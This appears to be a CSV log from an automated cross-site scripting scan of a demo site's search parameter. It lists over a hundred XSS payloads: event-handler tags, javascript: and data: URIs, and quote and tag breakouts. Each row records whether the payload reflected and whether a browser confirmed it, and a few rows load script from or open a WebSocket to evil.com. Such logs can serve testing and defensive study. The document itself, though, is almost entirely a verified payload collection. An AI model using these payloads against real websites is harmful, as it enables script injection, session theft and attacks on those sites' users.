Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:59.312,2026-01-10 17:58:59.421,0.109,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.318,2026-01-10 17:58:59.421,0.102,https://demo-knsl.onrender.com/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.368,2026-01-10 17:58:59.472,0.104,https://demo-knsl.onrender.com/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.377,2026-01-10 17:58:59.490,0.113,https://demo-knsl.onrender.com/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.399,2026-01-10 17:58:59.507,0.108,https://demo-knsl.onrender.com/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.410,2026-01-10 17:58:59.513,0.103,https://demo-knsl.onrender.com/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.421,2026-01-10 17:58:59.525,0.104,https://demo-knsl.onrender.com/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.421,2026-01-10 17:58:59.531,0.111,https://demo-knsl.onrender.com/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.233,2026-01-10 17:58:59.532,0.300,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.307,2026-01-10 17:58:59.550,0.243,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.490,2026-01-10 17:58:59.552,0.061,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:59.507,2026-01-10 17:58:59.563,0.056,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:59.513,2026-01-10 17:58:59.580,0.067,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:59.472,2026-01-10 17:58:59.580,0.108,https://demo-knsl.onrender.com/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.525,2026-01-10 17:58:59.582,0.057,https://demo-knsl.onrender.com/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:59.550,2026-01-10 17:58:59.617,0.067,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.563,2026-01-10 17:58:59.620,0.057,https://demo-knsl.onrender.com/search,GET,q,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
2026-01-10 17:58:59.532,2026-01-10 17:58:59.641,0.109,https://demo-knsl.onrender.com/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.531,2026-01-10 17:58:59.641,0.110,https://demo-knsl.onrender.com/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.552,2026-01-10 17:58:59.665,0.114,https://demo-knsl.onrender.com/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.580,2026-01-10 17:58:59.688,0.109,https://demo-knsl.onrender.com/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.582,2026-01-10 17:58:59.688,0.106,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.617,2026-01-10 17:58:59.714,0.097,https://demo-knsl.onrender.com/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.620,2026-01-10 17:58:59.722,0.103,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.641,2026-01-10 17:58:59.739,0.098,https://demo-knsl.onrender.com/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.641,2026-01-10 17:58:59.746,0.105,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.665,2026-01-10 17:58:59.765,0.100,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.688,2026-01-10 17:58:59.787,0.099,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.688,2026-01-10 17:58:59.788,0.100,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.714,2026-01-10 17:58:59.814,0.100,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.722,2026-01-10 17:58:59.822,0.100,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.092,2026-01-10 17:58:59.845,0.753,https://demo-knsl.onrender.com/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:58:59.739,2026-01-10 17:58:59.849,0.110,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.746,2026-01-10 17:58:59.858,0.112,https://demo-knsl.onrender.com/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.788,2026-01-10 17:58:59.902,0.114,https://demo-knsl.onrender.com/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.787,2026-01-10 17:58:59.902,0.115,https://demo-knsl.onrender.com/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.814,2026-01-10 17:58:59.952,0.137,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.849,2026-01-10 17:58:59.959,0.110,https://demo-knsl.onrender.com/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.822,2026-01-10 17:58:59.970,0.148,https://demo-knsl.onrender.com/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.858,2026-01-10 17:58:59.973,0.115,https://demo-knsl.onrender.com/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.845,2026-01-10 17:58:59.978,0.133,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.765,2026-01-10 17:58:59.982,0.217,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.902,2026-01-10 17:59:00.001,0.098,https://demo-knsl.onrender.com/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.902,2026-01-10 17:59:00.005,0.104,https://demo-knsl.onrender.com/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.970,2026-01-10 17:59:00.076,0.106,https://demo-knsl.onrender.com/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.959,2026-01-10 17:59:00.088,0.129,https://demo-knsl.onrender.com/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.978,2026-01-10 17:59:00.089,0.111,https://demo-knsl.onrender.com/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.982,2026-01-10 17:59:00.100,0.118,https://demo-knsl.onrender.com/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.973,2026-01-10 17:59:00.106,0.134,https://demo-knsl.onrender.com/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.001,2026-01-10 17:59:00.107,0.107,https://demo-knsl.onrender.com/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.005,2026-01-10 17:59:00.113,0.108,https://demo-knsl.onrender.com/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.385,2026-01-10 17:59:00.143,0.758,https://demo-knsl.onrender.com/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.107,2026-01-10 17:59:00.164,0.056,https://demo-knsl.onrender.com/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.076,2026-01-10 17:59:00.167,0.091,https://demo-knsl.onrender.com/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.089,2026-01-10 17:59:00.202,0.114,https://demo-knsl.onrender.com/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.088,2026-01-10 17:59:00.207,0.119,https://demo-knsl.onrender.com/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.113,2026-01-10 17:59:00.214,0.101,https://demo-knsl.onrender.com/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.100,2026-01-10 17:59:00.216,0.116,https://demo-knsl.onrender.com/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.143,2026-01-10 17:59:00.246,0.103,https://demo-knsl.onrender.com/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.167,2026-01-10 17:59:00.271,0.104,https://demo-knsl.onrender.com/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.164,2026-01-10 17:59:00.286,0.122,https://demo-knsl.onrender.com/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.202,2026-01-10 17:59:00.313,0.111,https://demo-knsl.onrender.com/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.214,2026-01-10 17:59:00.313,0.099,https://demo-knsl.onrender.com/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.580,2026-01-10 17:59:00.315,0.735,https://demo-knsl.onrender.com/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.207,2026-01-10 17:59:00.319,0.112,https://demo-knsl.onrender.com/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.216,2026-01-10 17:59:00.331,0.115,https://demo-knsl.onrender.com/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.271,2026-01-10 17:59:00.367,0.096,https://demo-knsl.onrender.com/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.286,2026-01-10 17:59:00.385,0.099,https://demo-knsl.onrender.com/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.313,2026-01-10 17:59:00.420,0.107,https://demo-knsl.onrender.com/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.313,2026-01-10 17:59:00.421,0.107,https://demo-knsl.onrender.com/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.319,2026-01-10 17:59:00.424,0.105,https://demo-knsl.onrender.com/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.315,2026-01-10 17:59:00.429,0.114,https://demo-knsl.onrender.com/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.331,2026-01-10 17:59:00.446,0.115,https://demo-knsl.onrender.com/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.367,2026-01-10 17:59:00.468,0.101,https://demo-knsl.onrender.com/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.385,2026-01-10 17:59:00.492,0.107,https://demo-knsl.onrender.com/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.446,2026-01-10 17:59:00.503,0.057,https://demo-knsl.onrender.com/search,GET,q,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.424,2026-01-10 17:59:00.525,0.101,https://demo-knsl.onrender.com/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.420,2026-01-10 17:59:00.526,0.106,https://demo-knsl.onrender.com/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.421,2026-01-10 17:59:00.530,0.109,https://demo-knsl.onrender.com/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.429,2026-01-10 17:59:00.530,0.102,https://demo-knsl.onrender.com/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.468,2026-01-10 17:59:00.601,0.133,https://demo-knsl.onrender.com/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.492,2026-01-10 17:59:00.602,0.110,https://demo-knsl.onrender.com/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.503,2026-01-10 17:59:00.623,0.120,https://demo-knsl.onrender.com/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.525,2026-01-10 17:59:00.641,0.116,https://demo-knsl.onrender.com/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.530,2026-01-10 17:59:00.641,0.111,https://demo-knsl.onrender.com/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.526,2026-01-10 17:59:00.644,0.118,https://demo-knsl.onrender.com/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:59:00.530,2026-01-10 17:59:00.649,0.119,https://demo-knsl.onrender.com/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:59.952,2026-01-10 17:59:00.678,0.726,https://demo-knsl.onrender.com/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.623,2026-01-10 17:59:01.764,1.141,https://demo-knsl.onrender.com/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.602,2026-01-10 17:59:01.764,1.162,https://demo-knsl.onrender.com/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.601,2026-01-10 17:59:01.764,1.163,https://demo-knsl.onrender.com/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.764,2026-01-10 17:59:01.830,0.066,https://demo-knsl.onrender.com/search,GET,q,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.106,2026-01-10 17:59:01.835,1.728,https://demo-knsl.onrender.com/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.830,2026-01-10 17:59:01.903,0.073,https://demo-knsl.onrender.com/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.246,2026-01-10 17:59:01.983,1.737,https://demo-knsl.onrender.com/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.641,2026-01-10 17:59:02.765,2.124,https://demo-knsl.onrender.com/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.644,2026-01-10 17:59:02.765,2.121,https://demo-knsl.onrender.com/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.649,2026-01-10 17:59:02.765,2.116,https://demo-knsl.onrender.com/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,No,,High
2026-01-10 17:59:00.641,2026-01-10 17:59:02.836,2.195,https://demo-knsl.onrender.com/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,No,,High
2026-01-10 17:59:02.765,2026-01-10 17:59:02.839,0.074,https://demo-knsl.onrender.com/search,GET,q,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:59:02.839,2026-01-10 17:59:02.898,0.058,https://demo-knsl.onrender.com/search,GET,q,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:59:02.836,2026-01-10 17:59:02.902,0.066,https://demo-knsl.onrender.com/search,GET,q,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:59:02.898,2026-01-10 17:59:02.973,0.075,https://demo-knsl.onrender.com/search,GET,q,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:59:00.678,2026-01-10 17:59:02.984,2.306,https://demo-knsl.onrender.com/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.835,2026-01-10 17:59:03.767,1.932,https://demo-knsl.onrender.com/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.764,2026-01-10 17:59:03.767,2.002,https://demo-knsl.onrender.com/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.764,2026-01-10 17:59:03.767,2.002,https://demo-knsl.onrender.com/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.903,2026-01-10 17:59:03.838,1.934,https://demo-knsl.onrender.com/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,No,,High
2026-01-10 17:59:01.983,2026-01-10 17:59:03.986,2.003,https://demo-knsl.onrender.com/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,No,,High
2026-01-10 17:59:02.765,2026-01-10 17:59:04.768,2.002,https://demo-knsl.onrender.com/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,No,,High
2026-01-10 17:59:02.902,2026-01-10 17:59:04.768,1.866,https://demo-knsl.onrender.com/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,No,,High
2026-01-10 17:59:02.765,2026-01-10 17:59:04.768,2.002,https://demo-knsl.onrender.com/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,No,,High
2026-01-10 17:59:02.984,2026-01-10 17:59:04.840,1.856,https://demo-knsl.onrender.com/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,No,,High
2026-01-10 17:59:02.973,2026-01-10 17:59:04.987,2.014,https://demo-knsl.onrender.com/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:03.767,2026-01-10 17:59:05.769,2.003,https://demo-knsl.onrender.com/search,GET,q,""";alert(1);//",RAW_REFLECTION,No,,High
2026-01-10 17:59:03.767,2026-01-10 17:59:05.769,2.003,https://demo-knsl.onrender.com/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,No,,High
2026-01-10 17:59:03.767,2026-01-10 17:59:05.769,2.003,https://demo-knsl.onrender.com/search,GET,q,';alert(1);//,RAW_REFLECTION,No,,High
2026-01-10 17:59:03.838,2026-01-10 17:59:05.841,2.003,https://demo-knsl.onrender.com/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,No,,High
2026-01-10 17:59:03.986,2026-01-10 17:59:05.988,2.002,https://demo-knsl.onrender.com/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,No,,High
2026-01-10 17:59:04.768,2026-01-10 17:59:06.770,2.002,https://demo-knsl.onrender.com/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:04.768,2026-01-10 17:59:06.770,2.002,https://demo-knsl.onrender.com/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,No,,High
2026-01-10 17:59:04.768,2026-01-10 17:59:06.770,2.002,https://demo-knsl.onrender.com/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,No,,High
2026-01-10 17:59:04.840,2026-01-10 17:59:06.843,2.003,https://demo-knsl.onrender.com/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:04.987,2026-01-10 17:59:06.989,2.002,https://demo-knsl.onrender.com/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:05.769,2026-01-10 17:59:07.771,2.002,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:05.769,2026-01-10 17:59:07.771,2.002,https://demo-knsl.onrender.com/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:05.769,2026-01-10 17:59:07.771,2.002,https://demo-knsl.onrender.com/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:05.841,2026-01-10 17:59:07.844,2.003,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:07.844,2026-01-10 17:59:07.902,0.057,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:59:05.988,2026-01-10 17:59:07.990,2.002,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:06.770,2026-01-10 17:59:08.772,2.002,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:06.770,2026-01-10 17:59:08.772,2.002,https://demo-knsl.onrender.com/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:59:06.770,2026-01-10 17:59:08.772,2.002,https://demo-knsl.onrender.com/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:59:06.843,2026-01-10 17:59:08.845,2.002,https://demo-knsl.onrender.com/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:59:06.989,2026-01-10 17:59:08.991,2.002,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,No,,High
2026-01-10 17:59:07.771,2026-01-10 17:59:09.773,2.002,https://demo-knsl.onrender.com/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 17:59:07.771,2026-01-10 17:59:09.773,2.002,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,No,,High
2026-01-10 17:59:07.771,2026-01-10 17:59:09.773,2.002,https://demo-knsl.onrender.com/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:07.902,2026-01-10 17:59:09.847,1.945,https://demo-knsl.onrender.com/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,No,,High
2026-01-10 17:59:07.990,2026-01-10 17:59:09.993,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,No,,High
2026-01-10 17:59:08.772,2026-01-10 17:59:10.775,2.002,https://demo-knsl.onrender.com/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:08.772,2026-01-10 17:59:10.775,2.002,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:08.772,2026-01-10 17:59:10.775,2.002,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,No,,High
2026-01-10 17:59:08.845,2026-01-10 17:59:10.848,2.003,https://demo-knsl.onrender.com/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,No,,High
2026-01-10 17:59:08.991,2026-01-10 17:59:10.994,2.003,https://demo-knsl.onrender.com/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,No,,High
